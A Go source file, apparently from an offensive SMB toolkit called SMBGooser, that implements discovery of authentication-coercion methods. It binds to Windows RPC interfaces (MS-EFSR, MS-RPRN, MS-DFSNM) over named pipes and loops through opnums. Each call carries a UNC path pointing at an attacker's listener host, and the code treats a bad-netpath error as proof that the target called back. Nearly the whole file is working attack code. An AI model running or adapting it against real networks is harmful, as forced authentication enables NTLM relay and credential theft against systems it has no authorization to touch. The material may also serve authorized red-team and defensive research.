package coerce

import (
	"context"
	"fmt"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
)

// Discovery provides tools for finding new coercion methods
type Discovery struct {
	session *smb.Session
	ipcTree *smb.Tree
}

// NewDiscovery creates a coercion discovery helper
func NewDiscovery(session *smb.Session, ipcTree *smb.Tree) *Discovery {
	return &Discovery{
		session: session,
		ipcTree: ipcTree,
	}
}

// DiscoverResult holds the result of opnum enumeration
type DiscoverResult struct {
	InterfaceUUID dcerpc.UUID
	InterfaceName string
	PipeName      string
	Opnum         uint16
	Status        string // "success", "access_denied", "error", "bad_netpath"
	Error         error
}

// EnumerateOpnums tests opnums on an interface looking for coercion candidates
func (d *Discovery) EnumerateOpnums(ctx context.Context, pipeName string, interfaceUUID dcerpc.UUID, version uint32, listener string, startOpnum, endOpnum uint16) ([]DiscoverResult, error) {
	// Open pipe
	p, err := pipe.Open(ctx, d.ipcTree, pipeName)
	if err != nil {
		return nil, fmt.Errorf("failed to open pipe: %w", err)
	}
	defer p.Close()

	// Create RPC client
	rpc := dcerpc.NewClient(p)

	// Bind to interface
	if err := rpc.Bind(interfaceUUID, version); err != nil {
		return nil, fmt.Errorf("bind failed: %w", err)
	}

	var results []DiscoverResult

	// Test each opnum
	for opnum := startOpnum; opnum <= endOpnum; opnum++ {
		result := d.testOpnum(rpc, interfaceUUID, pipeName, opnum, listener)
		results = append(results, result)

		// If we got ERROR_BAD_NETPATH, this opnum triggers coercion!
		if result.Status == "bad_netpath" {
			fmt.Printf("[!] FOUND COERCION: opnum %d triggered callback!\n", opnum)
		}
	}

	return results, nil
}

// testOpnum tests a single opnum for coercion
func (d *Discovery) testOpnum(rpc *dcerpc.Client, interfaceUUID dcerpc.UUID, pipeName string, opnum uint16, listener string) DiscoverResult {
	result := DiscoverResult{
		InterfaceUUID: interfaceUUID,
		PipeName:      pipeName,
		Opnum:         opnum,
	}

	// Look up interface name if known
	if info := dcerpc.LookupInterface(interfaceUUID); info != nil {
		result.InterfaceName = info.Name
	}

	// Create a generic stub with the listener path
	// This tries to trigger remote file access
	stub := createGenericUNCStub(listener)

	_, err := rpc.Call(opnum, stub)
	if err != nil {
		errMsg := err.Error()
		switch {
		case errMsg == "ERROR_BAD_NETPATH" || contains(errMsg, "0x6f7"):
			result.Status = "bad_netpath" // Coercion candidate!
		case contains(errMsg, "0x5") || contains(errMsg, "access denied"):
			result.Status = "access_denied"
		case contains(errMsg, "procedure out of range"):
			result.Status = "invalid_opnum"
		default:
			result.Status = "error"
			result.Error = err
		}
	} else {
		result.Status = "success"
	}

	return result
}

// createGenericUNCStub creates a stub with UNC path for testing
func createGenericUNCStub(listener string) []byte {
	w := dcerpc.NewNDRWriter()

	// Most coercion functions take a filename/path as first parameter
	// We send a pointer + string that triggers UNC access
	w.WritePointer()
	w.WriteUnicodeString(fmt.Sprintf("\\\\%s\\share\\file.txt", listener))

	return w.Bytes()
}

// contains checks if a string contains a substring
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsImpl(s, substr))
}

func containsImpl(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// ScanInterface scans all opnums of an interface for coercion
func (d *Discovery) ScanInterface(ctx context.Context, pipeName string, interfaceUUID dcerpc.UUID, version uint32, listener string) ([]DiscoverResult, error) {
	return d.EnumerateOpnums(ctx, pipeName, interfaceUUID, version, listener, 0, 100)
}

// QuickScan does a quick scan of common coercion-prone opnum ranges
func (d *Discovery) QuickScan(ctx context.Context, listener string) ([]DiscoverResult, error) {
	var allResults []DiscoverResult

	// Common interfaces to scan
	scans := []struct {
		pipe    string
		uuid    dcerpc.UUID
		version uint32
		start   uint16
		end     uint16
	}{
		{"lsarpc", dcerpc.EFSR_UUID, 1, 0, 15},   // MS-EFSR
		{"spoolss", dcerpc.RPRN_UUID, 1, 60, 70}, // MS-RPRN
		{"netdfs", dcerpc.DFSNM_UUID, 3, 10, 20}, // MS-DFSNM
	}

	for _, scan := range scans {
		results, err := d.EnumerateOpnums(ctx, scan.pipe, scan.uuid, scan.version, listener, scan.start, scan.end)
		if err != nil {
			// Log but continue
			continue
		}
		allResults = append(allResults, results...)
	}

	return allResults, nil
}
